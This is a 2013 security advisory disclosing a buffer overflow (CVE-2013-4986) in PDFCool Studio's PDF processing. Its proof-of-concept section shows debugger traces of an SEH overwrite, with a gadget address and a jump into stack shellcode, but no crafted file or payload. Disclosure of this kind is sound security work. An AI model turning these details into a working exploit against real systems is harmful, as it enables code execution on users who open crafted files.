PDFCool Studio Buffer Overflow Vulnerability


1. *Advisory Information*

Title: PDFCool Studio Buffer Overflow Vulnerability
Advisory ID: CORE-2013-0828
Advisory URL:
http://www.coresecurity.com/advisories/pdfcool-studio-buffer-overflow-vulnerability
Date published: 2013-10-02
Date of last update: 2013-10-02
Vendors contacted: IconCool Software
Release mode: User release


2. *Vulnerability Information*

Class: Buffer overflow [CWE-119]
Impact: Code execution
Remotely Exploitable: No
Locally Exploitable: Yes
CVE Name: CVE-2013-4986


3. *Vulnerability Description*

PDFCool Studio Suite [1], [2] is prone to a security vulnerability when
processing PDF files. This vulnerability could be exploited by a remote
attacker to execute arbitrary code on the target machine by enticing
users to open a specially crafted PDF file (client-side attack).


4. *Vulnerable Packages*

   . PDFAX0722_IconCool.dll v7.22.1125.2121.
   . Other versions are probably affected too, but they were not checked.


5. *Vendor Information, Solutions and Workarounds*

There was no official answer from vendor after several attempts to
report this vulnerability (see [Sec. 8]). As mitigation action, given
that this is a client-side vulnerability, avoid to open untrusted PDF
files. Contact vendor for further information.


6. *Credits*

This vulnerability was discovered and researched by Marcos Accossatto
from CORE Exploit Writers Team.


7. *Technical Description / Proof of Concept Code*

Below is shown the result of opening the maliciously crafted PDF file
[3] on Windows XP SP3 (EN):


/-----
$+A50C4  >  8B07              MOV EAX,DWORD PTR DS:[EDI]
$+A50C6  >  C740 14 1E000000  MOV DWORD PTR DS:[EAX+14],1E            
;   <== Exception - Tries to write to 909090A4
$+A50CD  >  8B5424 04         MOV EDX,DWORD PTR SS:[ESP+4]
$+A50D1  >  8950 18           MOV DWORD PTR DS:[EAX+18],EDX
$+A50D4  >  8BC7              MOV EAX,EDI
$+A50D6  >  8B10              MOV EDX,DWORD PTR DS:[EAX]

-----/

At that time, the 'EAX' register contains the first 'DWORD' of our
shellcode:


/-----
EAX 90909090
ECX 000007B4
EDX 0012E190

-----/

The stack's exception handler is overwritten with:

/-----
0012DDFC   FFFFF94D
0012DE00   0000000A
  ....       ....
0012DF6C   0EDDE2F1
0012DF70   909006EB  Pointer to next SEH record
0012DF74   005D88EF  SE handler
-----/

In the address '005D88EF' (the main executable module of PDFCool Studio)
we have:

/-----
005D88EF    5D                POP EBP
005D88F0    59                POP ECX
005D88F1    C3                RETN
-----/

and the stack:

/-----
0012DA2C   7C9032A8  RETURN to ntdll.7C9032A8
0012DA30   0012DB14
0012DA34   0012DF70
-----/

So, the 'RETN' of '005D88F1' will jump to '12DF70' (the stack) where our
shellcode is located:


/-----
0012DF70   EB 06             JMP SHORT 0012DF78
0012DF72   90                NOP
0012DF73   90                NOP
0012DF74   EF                OUT DX,EAX                               ;
I/O command
0012DF75   885D 00           MOV BYTE PTR SS:[EBP],BL
0012DF78   90                NOP
-----/

which means the normal execution flow can be altered in order to execute

arbitrary code.
